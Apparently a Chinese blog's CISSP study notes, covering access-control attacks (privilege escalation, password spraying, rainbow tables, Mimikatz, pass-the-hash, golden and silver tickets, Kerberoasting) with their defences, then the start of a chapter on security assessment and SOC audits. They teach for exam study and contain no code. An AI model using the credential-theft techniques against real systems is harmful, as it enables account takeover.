title="14.3 了解访问控制攻击"></a>14.3 了解访问控制攻击</h1><p>攻击者表示恶意入侵者。</p><p>攻击是企图利用系统漏洞并破坏保密性、完整性和可用性的所有尝试。</p><h3 id="风险要素"><a href="#风险要素" class="headerlink" title="风险要素"></a>风险要素</h3><h4 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h4><p>风险是利用漏洞造成损失（例如资产损坏）的可能性。</p><h4 id="威胁"><a href="#威胁" class="headerlink" title="威胁"></a>威胁</h4><p>威胁是可能导致不良结果的潜在事件，包括攻击者的潜在攻击、自然灾害事件、员工的意外行为。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>漏洞是任意类型的弱点。</p><p>弱点可能是硬件或软件的缺陷或限制造成的，也可能源自安全控制的缺乏。</p><p>风险管理试图通过实施控制措施或对策来减少或消除漏洞，或减少潜在威胁的影响。</p><p>消除风险是不可能或不可取的，专注于降低风险。</p><h2 id="14-3-1-常见访问控制攻击"><a href="#14-3-1-常见访问控制攻击" class="headerlink" title="14.3.1 常见访问控制攻击"></a>14.3.1 常见访问控制攻击</h2><h2 id="14-3-2-特权提升"><a href="#14-3-2-特权提升" class="headerlink" title="14.3.2 特权提升"></a>14.3.2 特权提升</h2><p>特权提升是指给予用户的特权超过了其应该有的权限。</p><p>本地管理员有本地设备的权限</p><p>域管理员有全域的权限</p><p>普通用户不应该有和管理员相同的权限</p><p>攻击者使用特权提升技术来获得额外的特权。</p><p>特权提升分为横向特权提升和垂直特权提升。</p><p>横向特权提升为获得更多相同的权限，也可以称为横向移动。</p><p>垂直特权提升为获得更高的权限。</p><p>托管服务账户的重要考虑因素是确保账户仅具有服务或应用程序所需的特权。</p><p>创建新的服务托管账户，给予最小权限。</p><h3 id="1-使用-su-和-sudo-命令"><a href="#1-使用-su-和-sudo-命令" class="headerlink" title="1. 使用 su 和 sudo 命令"></a>1. 使用 su 和 sudo 命令</h3><p>Linux 系统 root 账户，被称为超级用户 （superuser）账户。</p><p>su 命令默认切换到 root 账户，并需要输入 root 账户口令。</p><p>sudo 命令是超级用户执行（superuser do）。</p><p>sudo 组用户切换到 root 权限时不需要 root 账户口令，仅需要用户口令即可。</p><p>命令前添加 sudo ，则以 root 身份运行命令，日志记录普通用户使用 sudo 执行的所有命令。</p><p>使用 su命令切换到 su 账户，日志记录则记录 su 账户而不是普通用户账户记录活动。</p><h3 id="2-尽量减少-sudo-命令的使用"><a href="#2-尽量减少-sudo-命令的使用" class="headerlink" title="2. 尽量减少 sudo 命令的使用"></a>2. 尽量减少 sudo 命令的使用</h3><p>减少使用 sudo 命令，可以限制风险。</p><p>Windows 中也是最好创建服务账户，而不是使用本地系统账户。</p><h3 id="3-口令攻击"><a href="#3-口令攻击" class="headerlink" title="3. 口令攻击"></a>3. 口令攻击</h3><p>口令是最脆弱的身份认证方式。</p><p>特权账户的口令被获取，选择重建整个系统，而不是接受风险。</p><p>强口令（strong password）有助于防止口令攻击，要求字符类型的组合足够长。</p><p>避免使用明文存储口令，使用强哈希函数（SHA-3）生成口令的哈希值，存储口令的哈希值。</p><p>注意：相同口令运算时，哈希算法始终产生相同的哈希值。</p><p>不可以使用 MD5 等弱哈希函数进行口令的哈希计算。</p><p>避免使用默认口令。</p><h3 id="4-字典攻击"><a href="#4-字典攻击" class="headerlink" title="4. 字典攻击"></a>4. 字典攻击</h3><p>字典攻击是指尝试通过使用预定义数据库中的每个可能密码或公共或预期密码列表来发现密码。</p><p>一次性构造的密码是以前使用过的密码，但是只更改其中一个字符。</p><h3 id="5-暴力破解攻击"><a href="#5-暴力破解攻击" class="headerlink" title="5.  暴力破解攻击"></a>5.  暴力破解攻击</h3><p>暴力破解攻击是指通过尝试所有可能的字母、数字和符号的组合来找到用户的口令。</p><p>混合攻击（hybrid attack）先进行字典攻击，再使用一对一构造的口令来执行暴力破解攻击。</p><p>口令越长，包含字符类型越多，抵御暴力破解的能力就越强。</p><p>哈希计算口令进行认证优势：</p><ul><li>避免口令在网络上明文传输</li><li>口令也不会以明文存储</li><li></li></ul><p>比较分析或反向哈希匹配攻击：</p><p>直接计算口令的哈希值，使用哈希值进行比对猜测原始口令。</p><p>GPU 正在被用于暴力破解。</p><p>长口令需要更长的时间破解。</p><h3 id="6-喷射攻击"><a href="#6-喷射攻击" class="headerlink" title="6. 喷射攻击"></a>6. 喷射攻击</h3><p>喷射攻击（spraying attack）是一种特殊类型的暴力破解攻击，口令固定，变换不同账户名和系统进行尝试。</p><p>在线密码攻击中使用喷射攻击，并试图绕过账户锁定的安全控制措施。</p><h3 id="7-凭证填充攻击"><a href="#7-凭证填充攻击" class="headerlink" title="7. 凭证填充攻击"></a>7. 凭证填充攻击</h3><p>口令喷射攻击试图绕过账户锁定策略。</p><p>凭证填充攻击仅检查每个站点的单用户名及口令，也就是同一个账户口令组合在多个站点尝试。</p><h3 id="8-生日攻击"><a href="#8-生日攻击" class="headerlink" title="8. 生日攻击"></a>8. 生日攻击</h3><p>生日攻击的重点是寻求碰撞，类似于查找具有相同哈希值的任何两个密码。</p><p>366 个不同的哈希值，那么只有 23  个哈希值样本的攻击者有 50% 的机会发现具有相同哈希值的两个密码。</p><p>生日攻击防御方案：<br>使用足够长度的哈希算法，并使用盐。</p><h3 id="9-彩虹表攻击"><a href="#9-彩虹表攻击" class="headerlink" title="9. 彩虹表攻击"></a>9. 彩虹表攻击</h3><p>彩虹表通过使用大量预计算的哈希数据库来减少所需的时间。</p><p>彩虹表攻击只是比较哈希值，直至找到匹配项，可以显著减少破解口令所需的时间。</p><p>彩虹表攻击防御方案：</p><p>使用加盐（salt）口令来降低彩虹表攻击的有效性。</p><p>盐是在进行哈希计算之前添加到口令中的一组随机位。</p><p>Argon2、bcrypt 和 PBKDF2 是三种常用的加盐密码算法。</p><p>添加外部胡椒，也就是存储在别处的大常数，会更增加攻击的困难程度。</p><h3 id="10-Mimikatz"><a href="#10-Mimikatz" class="headerlink" title="10. Mimikatz"></a>10. Mimikatz</h3><p>2007 年发布了 Mimikatz 工具。</p><p>Mimikatz 通过读取内存凭证来进行漏洞利用。</p><p>Mimikatz 功能：</p><p><strong>从内存中读取口令</strong></p><p>可以提取和读取存储在本地安全机构子系统服务进程中的明文口令和 PIN。</p><p><strong>提取 Kerberos 票证</strong></p><p>Mimikatz 包含一个访问 Kerberos API 的 Kerberos 模块。</p><p><strong>提取证书和私钥</strong></p><p>包含一个 Windows CryptoAPI 模块，该模块可以提取系统上的证书以及证书相关联的私钥。</p><p><strong>读取内存中的 LM 和 NTLM 口令哈希值</strong></p><p>某些 Windows 系统仍然会创建哈希值并将其存储在内存中。</p><p><strong>在本地安全机构子系统服务（LSASS）中读取明文口令</strong></p><p>LSASS 通常不会以明文形式存储口令，但恶意软件可以修改注册表，启动摘要认证（digest authentication）后 可以读取口令。</p><p><strong>枚举正在运行的进程</strong></p><p>攻击者可以使用此功能来识别用于向其他目标发起攻击的进程。</p><p>攻击者可以在远程系统上将 Mimikatz 当作无文件恶意软件运行，使用 PowerShell 脚本 将 Mimikatz 加载到内存中。</p><h3 id="11-哈希传递（PtH）攻击"><a href="#11-哈希传递（PtH）攻击" class="headerlink" title="11. 哈希传递（PtH）攻击"></a>11. 哈希传递（PtH）攻击</h3><p>哈希传递 PtH 攻击是指攻击者将捕获的口令哈希值发送到身份认证服务。</p><p>主要与使用 NTLM（NT LAN Manager）或 Kerberos 的 Windows 系统相关。</p><p>攻击步骤：<br>1、使用 Mimikatz 等工具捕获用户口令哈希值。</p><p>2、攻击者使用凭证进行身份认证。</p><p>3、成功登录，攻击者可以使用登录成功账户在整个网络中漫游。</p><p>防御方案：<br>防止第一台计算机被感染。</p><h3 id="12-Kerberos-漏洞利用攻击"><a href="#12-Kerberos-漏洞利用攻击" class="headerlink" title="12. Kerberos 漏洞利用攻击"></a>12. Kerberos 漏洞利用攻击</h3><p>微软活动目录将 Kerberos 用作主要的身份认证协议。</p><p>Kerberos 容易受到 MimiKatz、Rubeus（C# 语言编写，适用于Windows系统）、Impacket（用 Python 语言编写，适用于 Linux 系统）</p><p>Kerberos 漏洞利用攻击内容：</p><p><strong>超哈希传递攻击</strong></p><p>也称为传递密钥</p><p>NTLM 被禁用时，系统仍然会创建 NTLM 哈希值存储在内存中，使用该方法替代哈希传递攻击。</p><p>攻击者使用用户口令哈希获取的票证TGT，并使用 TGT 访问网络资源。</p><p><strong>票证传递</strong></p><p>攻击者试图获取 lsass.exe 进程中保存的票证，冒充用户。</p><p><strong>白银票证（silver ticket）</strong>TGS</p><p>使用截获的服务账户 NTLM 哈希值创建票证授予服务（TGS）票证，从而获取服务账户的所有特权。</p><p><strong>黄金票证</strong> TGT</p><p>获得 Kerberos 服务账户（KRBTGT）的哈希值，攻击者可以在活动目录中随意创建票证。</p><p>KRBTGT 账户使用口令的哈希值对域内的所有 Kerberos 票证进行加密和签名。</p><p>KRBTGT 账户口令永远不会变，其哈希值也永远不会改变。</p><p>黄金票证允许攻击者创建伪造的 Kerberos 票证并为任何服务请求 TGS 票证。</p><p><strong>Kerberos 暴力破解</strong></p><p>攻击者在 Linux 系统上运行 kerbrute.py 或在 Windows 系统上运行 Rubeus，猜测口令和用户名。</p><p><strong>ASREPRoast</strong></p><p>识别未启用 Kerberos 预身份认证的用户。</p><p>Kerberos 预身份认证是 Kerberos 的一项安全功能，有助于抵御口令猜测攻击。</p><p>攻击内容：</p><p>禁用预身份认证</p><p>攻击者向 KDC 认证服务器发送身份认证请求</p><p>KDC 返回票证授予票证（TGT），使用客户端的口令进行加密</p><p>攻击者发起离线攻击来解密票证获取客户的口令</p><p><strong>Kerberoasting</strong></p><p>收集加密的票证授予服务（TGS）票证。</p><p>服务账户使用 TGS 票证。</p><p>目的在于找到没有 Kerberos 预身份认证的用户。</p><h3 id="13-嗅探攻击"><a href="#13-嗅探攻击" class="headerlink" title="13. 嗅探攻击"></a>13. 嗅探攻击</h3><p>指捕获通过网络发送的数据包，目的是分析数据包。</p><p>嗅探器（也称为数据包分析器或协议分析器）。</p><p>嗅探攻击可以捕获和读取通过网络以明文形式发送的任何数据，包括口令。</p><p><strong>嗅探攻击防御技术</strong></p><ul><li>加密通过网络发送的所有敏感数据（包括口令）。Kerberos 会加密票证。</li><li>避免使用 HTTP、FTP、Telnet 等不安全的协议，应该使用 HTTPS、SFTP、SSH 等安全协议</li><li>无法加密时，使用一次性口令</li><li>使用物理安全措施保护网络设备。</li><li>监控网络来获取嗅探器的特征，例如入侵检测系统。</li></ul><h3 id="14-欺骗攻击"><a href="#14-欺骗攻击" class="headerlink" title="14. 欺骗攻击"></a>14. 欺骗攻击</h3><p>欺骗也被称为伪装：是伪装成某种东西或某个人。</p><p>使用他人凭证</p><p>网络钓鱼</p><p>IP 欺骗攻击，伪造 IP 地址</p><p><strong>电子邮件欺骗</strong></p><p>垃圾邮件发送者在“发件人”字段中使用假冒的电子邮件地址。</p><p><strong>电话号码欺骗</strong></p><p>利用来电显示服务，让呼叫者将其号码替换为另一个号码，VoIP 系统常用的技术。</p><h2 id="14-3-3-核心保护方法"><a href="#14-3-3-核心保护方法" class="headerlink" title="14.3.3 核心保护方法"></a>14.3.3 核心保护方法</h2><h3 id="控制对系统的物理访问"><a href="#控制对系统的物理访问" class="headerlink" title="控制对系统的物理访问"></a>控制对系统的物理访问</h3><h3 id="控制对文件的电子访问"><a href="#控制对文件的电子访问" class="headerlink" title="控制对文件的电子访问"></a>控制对文件的电子访问</h3><p>严密控制和监控对所有重要数据的电子访问，包括保持口令的文件。</p><p>需要调查未授权的口令数据库文件访问行为。</p><h3 id="哈希和加盐口令"><a href="#哈希和加盐口令" class="headerlink" title="哈希和加盐口令"></a>哈希和加盐口令</h3><p>使用 Argon2、bcrypt 和 PBKDF2 等协议为口令加盐，考虑使用外部胡椒来保护口令</p><p>强口令+盐+胡椒</p><h3 id="使用口令掩码"><a href="#使用口令掩码" class="headerlink" title="使用口令掩码"></a>使用口令掩码</h3><p>确保应用程序永远不会在屏幕上明文显示口令。</p><p>降低肩窥的危害，避免不了利用观察键盘输入获取口令。</p><h3 id="部署多因素身份认证"><a href="#部署多因素身份认证" class="headerlink" title="部署多因素身份认证"></a>部署多因素身份认证</h3><h3 id="使用账户锁定控制"><a href="#使用账户锁定控制" class="headerlink" title="使用账户锁定控制"></a>使用账户锁定控制</h3><p>账户锁定机制有助于抵御在线口令攻击。</p><p>用户输入错误口令达到指定次数后，会锁定账户。</p><p>不能阻止对被盗口令数据库的离线破解。</p><h3 id="使用上次登录通知"><a href="#使用上次登录通知" class="headerlink" title="使用上次登录通知"></a>使用上次登录通知</h3><p>显示上次成功登录时间、日期和位置（计算机名、IP 地址）</p><p>用于让用户发现其他人是否登录了自己的账户。</p><h3 id="用户安全意识培训"><a href="#用户安全意识培训" class="headerlink" title="用户安全意识培训"></a>用户安全意识培训</h3><p>确保用户理解安全的重要性和使用强口令的好处。</p><p>告知用户避免共享或抄写口令。</p><p>提示用户如何创建强口令，并提供预防肩窥的措施。</p><p>告知不要使用相同口令。</p><p>告知常见社会工程攻击。</p><h1 id="14-4-本章小结"><a href="#14-4-本章小结" class="headerlink" title="14.4 本章小结"></a>14.4 本章小结</h1><h1 id="14-5-考试要点"><a href="#14-5-考试要点" class="headerlink" title="14.5 考试要点"></a>14.5 考试要点</h1><h2 id="识别常见的授权机制"><a href="#识别常见的授权机制" class="headerlink" title="识别常见的授权机制"></a>识别常见的授权机制</h2><p>基于经身份认证的主体的特权，授权机制确保请求活动或回客体的访问是可以实现的。</p><p>常见授权机制：<br>隐式拒绝</p><p>访问控制矩阵</p><p>能力表</p><p>约束接口</p><p>依赖内容的控制</p><p>基于上下文的控制</p><p>授权机制遵循因需可知、最小特征和职责分离等安全原则。</p><h2 id="了解自主访问控制-DAC-模型的核心概念"><a href="#了解自主访问控制-DAC-模型的核心概念" class="headerlink" title="了解自主访问控制 DAC 模型的核心概念"></a>了解自主访问控制 DAC 模型的核心概念</h2><p>DAC 模型中，每个对象都有一个所有者，所有者可以修改对象的访问权限。</p><p>每个对象都有一个定义权限（文件读取或修改）的访问控制列表。</p><p>其他访问控制模型都是非自主访问控制模型，管理员集中管理非自主访问控制模型。</p><h2 id="了解基于角色的访问控制（RBAC）模型的核心概念"><a href="#了解基于角色的访问控制（RBAC）模型的核心概念" class="headerlink" title="了解基于角色的访问控制（RBAC）模型的核心概念"></a>了解基于角色的访问控制（RBAC）模型的核心概念</h2><p>RBAC 模型使用基于任务的角色。</p><p>当管理员将用户移入角色或组，用户获得权限。</p><p>管理员移出角色或组，用户失去权限。</p><h2 id="了解基于规则的访问控制模型的核心概念"><a href="#了解基于规则的访问控制模型的核心概念" class="headerlink" title="了解基于规则的访问控制模型的核心概念"></a>了解基于规则的访问控制模型的核心概念</h2><p>基于规则的访问控制模型使用一组规则、限制或过滤器来确定访问。</p><p>防火墙的访问控制列表定义了允许访问和阻止访问的规则列表。</p><h2 id="了解强制访问控制（MAC）模型的核心概念"><a href="#了解强制访问控制（MAC）模型的核心概念" class="headerlink" title="了解强制访问控制（MAC）模型的核心概念"></a>了解强制访问控制（MAC）模型的核心概念</h2><p>MAC 模型使用标签来标识安全域。</p><p>主体需要具备相匹配的标签菜可以反问对象。</p><p>MAC 模型强制实施因需可知原则，并支持分层环境、分区环境或两者组合而成的混合环境。</p><p>MAC 模型通常被称为基于格的模型。</p><h2 id="了解基于风险的访问控制模型的核心概念"><a href="#了解基于风险的访问控制模型的核心概念" class="headerlink" title="了解基于风险的访问控制模型的核心概念"></a>了解基于风险的访问控制模型的核心概念</h2><p>基于风险的访问控制模型评估环境和情景，并依据基于软件的安全策略做出决策。</p><p>可以基于多种因素来控制访问，例如基于IP、多重身份认证以及用户设备。</p><p>高级实现可以使用机器学习来评估风险。</p><h2 id="了解互联网使用的单点登录方法"><a href="#了解互联网使用的单点登录方法" class="headerlink" title="了解互联网使用的单点登录方法"></a>了解互联网使用的单点登录方法</h2><p>单点登录 SSO 是一种机制，允许主体经过一次身份认证便可访问多个对象。</p><p>安全断言标记语言SAML：基于 XML 的开放标准，用于交换身份认证和授权信息。</p><p>OAuth2.0 ：RFC 6749 中描述的授权框架，并得到许多在线网站的支持。</p><p>OASIS 维护 OpenID 和 OpenID Connect (OIDC )。</p><p>OpenID 提供身份认证。</p><p>OIDC 使用 OAuth 框架并基于 OpenID 标准来提供身份认证和授权。</p><h2 id="了解-Kerberos"><a href="#了解-Kerberos" class="headerlink" title="了解 Kerberos"></a>了解 Kerberos</h2><p>Kerberos 是最常用的单点登录方法。</p><p>Kerberos 主要用途是身份认证。</p><p>Kerberos 使用对称密码技术和票证来证明身份标识并提供身份认证。</p><p>一台服务器与网络时间协议 NTP 保持时间同步，其他客户端保持时间同步。</p><h2 id="了解-AAA-协议的目的"><a href="#了解-AAA-协议的目的" class="headerlink" title="了解 AAA 协议的目的"></a>了解 AAA 协议的目的</h2><p>AAA 协议提供集中的身份认证，授权和记账服务。</p><p>网络访问（或远程访问）系统使用 AAA 协议。</p><p>网络接入服务器是 RADIUS 服务器的客户端，RADIUS 服务器提供 AAA 服务。</p><p>RADIUS 使用 UDP协议，仅对口令进行加密。</p><p>TACACS+ 使用 TCP 协议，对整个会话进行加密。</p><p>Diameter 基于 RADIUS ，改进了 RADIUS 的缺陷，但是 Diameter 与 RADIUS 不兼容。</p><h2 id="了解特权提升"><a href="#了解特权提升" class="headerlink" title="了解特权提升"></a>了解特权提升</h2><p>使用特权提升技术获得额外特权。</p><p>横向提升：获得相同特权的其他设备</p><p>垂直提升：提高特权</p><p>限制授予服务账户的特权，减少 sudo 账户的使用，可以降低特权提升的成功率。</p><h2 id="了解哈希传递攻击"><a href="#了解哈希传递攻击" class="headerlink" title="了解哈希传递攻击"></a>了解哈希传递攻击</h2><p>允许攻击者利用捕获的用户口令哈希值来冒充用户。</p><p>哈希传递攻击利用 NTLM 漏洞，可会利用其他协议（Kerberos）攻击。</p><h2 id="了解-Kerberos-漏洞利用攻击"><a href="#了解-Kerberos-漏洞利用攻击" class="headerlink" title="了解 Kerberos 漏洞利用攻击"></a>了解 Kerberos 漏洞利用攻击</h2><p>Kerberos 攻击试图利用 Kerberos 票证中的漏洞。</p><p>攻击者捕获 lsass.exe 进程中保存的票证并发起票证传递攻击。</p><p>白银票证授予攻击者服务账户的所有权限。</p><p>获得 Kerberos 服务账户（KRBTGT）的口令哈希值后，攻击者可以创建黄金票证，从而在活动目录中随意创建票证 。</p><h2 id="了解暴力破解攻击和字典攻击的工作原理"><a href="#了解暴力破解攻击和字典攻击的工作原理" class="headerlink" title="了解暴力破解攻击和字典攻击的工作原理"></a>了解暴力破解攻击和字典攻击的工作原理</h2><p>针对被盗口令数据库文件或系统的登录提示执行的暴力破解攻击和字典攻击，目的都是获得口令。</p><p>暴力破解：攻击者遍历键盘字符的所有可能组合</p><p>字典攻击：使用预定义的可能口令列表</p><p>账户锁定控制机制可以有效抵御在线攻击。</p><h2 id="了解盐和胡椒预防口令攻击的工作原理"><a href="#了解盐和胡椒预防口令攻击的工作原理" class="headerlink" title="了解盐和胡椒预防口令攻击的工作原理"></a>了解盐和胡椒预防口令攻击的工作原理</h2><p>加盐是在进行哈希计算之前向口令添加额外的位，有助于抵御彩虹表攻击。</p><p>常见加盐算法：Argon2、bcrypt 和 PBKDF2</p><p>盐和口令哈希值存储在同一个数据库。</p><p>胡椒是一个非常大的常数，进一步提高哈希口令的安全性。</p><p>胡椒存储在哈希口令数据库之外的地方。</p><h2 id="了解嗅探攻击"><a href="#了解嗅探攻击" class="headerlink" title="了解嗅探攻击"></a>了解嗅探攻击</h2><p>在嗅探攻击&#x2F;窥探攻击中，攻击者使用数据包捕获工具（如嗅探器或协议分析器）来捕获、分析和读取网络发送的数据。</p><p>攻击者读取网络中的明文数据。</p><p>传输加密，可以有效抵御嗅探攻击。</p><h2 id="了解欺骗攻击"><a href="#了解欺骗攻击" class="headerlink" title="了解欺骗攻击"></a>了解欺骗攻击</h2><p>欺骗是伪装成某物或其他人。</p><p>欺骗可用于访问控制攻击。</p><p>获取用户凭证，冒用身份。</p><p>欺骗攻击包括电子邮件欺骗、电话号码欺骗、IP 欺骗。</p><p>网络钓鱼攻击使用欺骗方法。</p><h1 id="14章易错点"><a href="#14章易错点" class="headerlink" title="14章易错点"></a>14章易错点</h1><p>访问控制模型 MAC、DAC、RBAC</p><p>互联网上实现 SSO XML、SAML、OAuth、OpenID、OIDC</p><p>NAC</p><p>B✅</p><p>B✅</p><p>B✅</p><p>A✅</p><p>D✅</p><p>A✅</p><p>D✅</p><p>BC❌ B</p><p>A❌ B</p><p>B✅</p><p>C✅</p><p>A✅</p><p>A✅</p><p>B❌ A</p><p>​OpenID Connect（OIDC）使用 JSON Web 令牌（JWT）</p><p>​OpenID 提供身份认证，但不包括配置信息</p><p>D✅</p><p>C✅</p><p>B✅</p><p>B✅</p><p>D✅</p><p>C✅</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>15-域6安全评估与测试-安全评估与测试</title>
    <link href="/2025/04/21/security/seccert/cissp/15-%E5%9F%9F6%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%8E%E6%B5%8B%E8%AF%95-%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%8E%E6%B5%8B%E8%AF%95/"/>
    <url>/2025/04/21/security/seccert/cissp/15-%E5%9F%9F6%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%8E%E6%B5%8B%E8%AF%95-%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%8E%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>安全评估和测试方案实施定期检查，以确保安全控制措施充分到位，并有效执行其指定功能。</p><h1 id="15-1-构建安全评估和测试方案"><a href="#15-1-构建安全评估和测试方案" class="headerlink" title="15.1 构建安全评估和测试方案"></a>15.1 构建安全评估和测试方案</h1><p>安全评估和测试方案是信息安全团队的基础维护活动。</p><p>方案包括测试、评估和审计，目的是定期验证是否有足够的控制措施和是否有效。</p><h2 id="15-1-1-安全测试"><a href="#15-1-1-安全测试" class="headerlink" title="15.1.1 安全测试"></a>15.1.1 安全测试</h2><p>安全测试旨在验证某项控制措施是否正常运行。</p><p>测试包括：自动化扫描、工具辅助的渗透测试、破坏安全性的手动测试。</p><p>测试应该定期实施。</p><p>审查安全控制措施时，信息安全管理者（information security manager）需要考虑的因素：</p><ul><li>安全测试资源的可用性</li><li>待测试控制措施所保护的系统以及应用程序的重要性</li><li>待测试系统及应用程序所含信息的敏感性</li><li>实现控制措施的机制出现技术故障的可能性</li><li>危机安全性的控制措施出现错误配置的可能性</li><li>系统遭受攻击的风险</li><li>控制措施配置变更的频率</li><li>技术环境下可能影响控制措施性能的其他变更</li><li>开展控制措施测试的难度和时间</li><li>测试对正常业务运营造成的影响</li></ul><p>安全测试策略：</p><p>频繁的自动化测试，少量的手工测试。</p><p>需要对安全测试结果进行审查。</p><h2 id="15-1-2-安全评估"><a href="#15-1-2-安全评估" class="headerlink" title="15.1.2 安全评估"></a>15.1.2 安全评估</h2><p>安全评估是指对系统、应用程序或其他待测试环境的安全性进行全面审查。</p><p>安全人员进行风险评估，识别安全漏洞，提出修复建议。</p><p>安全评估包括：安全测试工具的使用、对威胁环境、当前和未来风险、目标环境价值的仔细审查。</p><p>安全评估成果：向管理层提交评估结果，报告需要以非技术语言描述的评估结果，并往往以提高待测环境安全性的具体建议作为结论。</p><p>评估可以内部执行，也可以外部第三方团队进行。</p><p>评估包括的组成部分：</p><ul><li><p><strong>规范</strong>（specification）是与待审计系统有关的文档。</p><p>规范通常包括政策、规程、要求、规格及设计。</p></li><li><p><strong>机制</strong>是满足规范的控制措施，可以基于硬件、软件和固件。</p></li><li><p><strong>活动</strong>是人员所采取的行动，行动包括执行备份、导致日志文件或审查账户历史记录。</p></li><li><p><strong>人员</strong>是指执行规范、机制及活动的人员</p></li></ul><h2 id="15-1-3-安全审计"><a href="#15-1-3-安全审计" class="headerlink" title="15.1.3 安全审计"></a>15.1.3 安全审计</h2><p>安全审计必须由独立审核员执行。</p><p>评估和测试的结果仅供内部使用，旨在评估控制措施，着眼于发现潜在的提升空间。</p><p>审计是为了向第三方证明控制措施的有效性而进行的评估。</p><p>审计员（auditor）为组织的安全控制状态提供一种客观中立的视角。</p><p>审计员撰写的报告面向的是董事会、监管或其他第三方。</p><h3 id="1-内部审计"><a href="#1-内部审计" class="headerlink" title="1. 内部审计"></a>1. 内部审计</h3><p>组织内部审计人员执行，适用于组织内部。</p><p>审计负责人直接向高管汇报。</p><h3 id="2-外部审计"><a href="#2-外部审计" class="headerlink" title="2. 外部审计"></a>2. 外部审计</h3><p>外部审计公司执行，因为没有利益冲突，所以具有很高的公信力。</p><p>四大审计公司：</p><ul><li>安永（Ernst &amp; Young）</li><li>德勤（Deloitte &amp; Touche）</li><li>普华永道（PricewaterhouseCoopers）</li><li>毕马威（KPMG）</li></ul><h3 id="3-第三方审计"><a href="#3-第三方审计" class="headerlink" title="3. 第三方审计"></a>3. 第三方审计</h3><p>由另一个组织或以另一个组织的名义进行的审计。例如：监管审计被监管公司。</p><p>执行审计的组织挑选审核员，并设计审计范围。</p><p>向其他组织提供服务的组织经常被要求进行第三方审计。</p><p>SSAE 18 通用标准，审计员使用该标准对服务组织进行评估，服务组织只需要开展一次第三方评估，可以与用户及潜在用户共享最终评估报告。</p><p>SSAE 18 和 ISAE 3402 声明通常被称为服务组织控制SOC审计，以三种形式出现</p><p><strong>SOC1 声明</strong>：评估可能影响财务报告准确性的组织控制措施。</p><p><strong>SOC2 声明</strong>：评估组织的控制措施，控制措施影响系统安全性（保密性、完整性和可用性）和隐私。</p><p>​SOC2 审计结果是保密的，通常仅根据保密协议对外共享。</p><p><strong>SOC3 声明</strong>：评估组织的控制措施，控制措施影响系统安全性（保密性、完整性和可用性）和隐私。</p><p>​SOC3 审计结果是公开披露的。</p><h4 id="两种不同类型的-SOC-报告"><a href="#两种不同类型的-SOC-报告" class="headerlink" title="两种不同类型的 SOC 报告"></a>两种不同类型的 SOC 报告</h4><h5 id="I-类报告"><a href="#I-类报告" class="headerlink" title="I 类报告"></a>I 类报告</h5><p>提供的审计员的意见仅仅涉及管理层提供的描述和控制措施的设计适用性</p><p>I 类报告仅涵盖特定时间点。</p><p>I 类报告视为文件审查，审计员以书面形式检查。</p><h5 id="II-类报告"><a href="#II-类报告" class="headerlink" title="II 类报告"></a>II 类报告</h5><p>进一步提供了审计员对控制措施运行有效性的意见，也就是说，审计员实际上确认了控制措施是否运行正常。</p><p>II 类报告涵盖更长的时间段：至少 6 个月的运行时间。</p><p>II 类报告视为传统的审计，审计员检查文档并现场验证控制功能是否正常。</p><p>II 类报告比 I 类报告可靠的多。</p><h3 id="4-审计标准"><a href="#4-审计标准" class="headerlink" title="4. 审计标准"></a>4. 审计标准</h3><p>审计或评估应该确保正确实施控制措施来实现目标。</p><p>信息和相关技术控制目标（Control Objectives for Information and related Technologies，COBIT）是一种开展审计和评估的通用框架。</p><p>COBIT 描述了组织信息系统需要具备的通用要求。</p><p>COBIT 框架由 ISACA 负责维护。</p><p>ISO 27001 描述了建立信息安全管理系统的标准方法。</p><p>ISO 27002 介绍了信息安全控制措施的更多细节。</p><h1 id="15-2-开展漏洞评估"><a href="#15-2-开展漏洞评估" class="headerlink" title="15.2 开展漏洞评估"></a>15.2 开展漏洞评估</h1><p>漏洞扫描和渗透测试可以识别系统或应用中包含的技术漏洞。</p><p>漏洞是系统和安全控制措施中可能被威胁利用的弱点。</p><h2 id="15-2-1-漏洞描述"><a href="#15-2-1-漏洞描述" class="headerlink" title="15.2.1 漏洞描述"></a>15.2.1 漏洞描述</h2><p>安全内容自动化协议（Security Content Automation Protocol，SCAP）。</p><p>SCAP 组件包括：</p><ul><li><strong>通用漏洞披露</strong>（Common Vulnerabilities and Exposures，CVE）：提供一种描述安全漏洞的命名系统。</li><li><strong>通用漏洞评分系统</strong>（Common Vulnerability Scoring System，CVSS）提供一种描述安全漏洞严重性的标准化评分系统。</li><li><strong>通用配置枚举</strong>（Common Configuration Enumeration，CCE）：提供一种系统配置问题的命名系统。</li><li>通用平台枚举（Common Platform Enumeration，CPE）提供一种操作系统、应用程序及设备的命名系统。</li><li>可扩展配置检查表描述格式（Extensible Configuration Checklist Description Format，XCCDF）：提供一种描述安全检查表的语言。</li><li>开放漏洞评估语言（Open Vulnerability and Assessment Language，OVAL）：提供一种描述安全测试过程的语言。</li></ul><h2 id="15-2-2-漏洞扫描"><a href="#15-2-2-漏洞扫描" class="headerlink" title="15.2.2 漏洞扫描"></a>15.2.2 漏洞扫描</h2><h3 id="1-网络发现扫描"><a href="#1-网络发现扫描" class="headerlink" title="1. 网络发现扫描"></a>1. 网络发现扫描</h3><p>网络发现扫描运用多种技术来扫描一段 IP 地址，从而探测存在开放网络端口的系统。</p><h4 id="TCP-SYN-扫描"><a href="#TCP-SYN-扫描" class="headerlink" title="TCP SYN 扫描"></a>TCP SYN 扫描</h4><p>向目标系统的每个端口发送一个设置 SYN 标志位的数据包。</p><p>如果扫描器收到设置 SYN  和 ACK  标志位的响应数据包，表明端口是开放的。</p><p>TCP SYN 扫描也被称为 “半开放”（half- open）扫描</p><h4 id="TCP-Connect-扫描"><a href="#TCP-Connect-扫描" class="headerlink" title="TCP Connect 扫描"></a>TCP Connect 